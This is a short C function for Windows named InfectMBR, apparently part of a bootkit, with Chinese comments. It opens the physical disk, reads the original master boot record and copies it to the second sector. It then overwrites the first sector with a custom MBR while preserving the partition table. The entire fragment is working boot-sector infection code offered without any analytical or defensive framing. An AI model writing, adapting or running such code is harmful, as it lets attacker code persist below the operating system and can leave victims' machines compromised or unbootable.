VOID InfectMBR()
{
	HANDLE	hDisk;
	BYTE*	pOriMBR;
	DWORD	Length;

	hDisk = CreateFile( DRIVER_SYMLINK,
						GENERIC_WRITE   | GENERIC_READ,
						FILE_SHARE_READ | FILE_SHARE_WRITE,
						NULL,
						OPEN_EXISTING,
						0,
						NULL
						);

	if (INVALID_HANDLE_VALUE == hDisk)
	{
		printf("Open DISK error\n");
		return;
	}
	
	pOriMBR = (BYTE*)VirtualAlloc(NULL, SECTOR_SIZE, MEM_COMMIT, PAGE_READWRITE | PAGE_NOCACHE);
	if (NULL == pOriMBR)
	{
		printf("VirtualAlloc() Error!\n");
		return;
	}

	SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
	if (!ReadFile(hDisk, pOriMBR, SECTOR_SIZE, &Length, NULL))
	{
		printf("ReadFile() Error!\n");
		return;
	}
	
	//将原来的MBR写入第2个扇区里面
	SetFilePointer(hDisk, SECTOR_SIZE, NULL, FILE_BEGIN);
	if (!WriteFile(hDisk, pOriMBR, SECTOR_SIZE, &Length, NULL))
	{
		printf("WriteFile() Error!\n");
		return;
	}

	//修复MBR当中的分区表，写入自己编写的MBR
	memcpy(&MBR[0x1b5], pOriMBR+0x1b5, 4 * 25);
	SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
	if (!WriteFile(hDisk, MBR, SECTOR_SIZE, &Length, NULL))
	{
		printf("WriteFile() MBR Error!\n");
		return;
	}

	VirtualFree(pOriMBR, SECTOR_SIZE, MEM_RELEASE);
	CloseHandle(hDisk);
	return;
}